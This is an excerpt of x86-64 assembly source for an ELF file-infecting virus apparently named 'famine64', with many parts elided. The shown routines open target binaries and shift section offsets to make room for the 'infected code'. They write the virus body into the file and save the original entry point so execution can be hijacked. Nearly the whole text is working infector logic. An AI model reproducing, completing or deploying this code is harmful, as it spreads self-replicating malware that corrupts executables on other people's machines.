...
close_file:	
	...
	jl		get_dat_elf_end			; so we just end the function.
	cmp		r11, 0					; lseek, and mmap jump to close_file if a problem occurs
	jl		get_dat_elf_end			; in that case we end the function.
...
find_highest_pt:
	...
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 2. Change the offset of sections higher than the section we infect.
...
change_section_offset:
	...
	mov 	r9d, DWORD [rdx + 40]		; ->e_shoff (size: 8)
...
modify_program:	
	...
	add		r9, QWORD [r8 + 32]			; add it the segment memory size
										; (the value is the virtual address of our infected code)
...
modify_next:	
	...
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(file_path, O_WRONLY, 0)                                 ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor		edx, edx
	mov		esi, 2
	;; rdi already contains the file path
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0						; test if < 0
	jl	 	write_end
	...
	mov		rsi, [rel famine64_func] 	; pointer of family64_func
	mov		rdx, [rel famine64_size]	; injection size
	sub		rdx, 8						; less the value of an Elf64_Addr
	mov		rax, SYS_WRITE
	syscall
	cmp		rax, 0
	jl		clean_write_end
	...
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edi, DWORD [rsp]			; file fd
	lea		rsi, [rsp + 20]				; load the address of the original program entry point
	...
	mov		rdx, QWORD [rsp + 12] 		; rest of file size
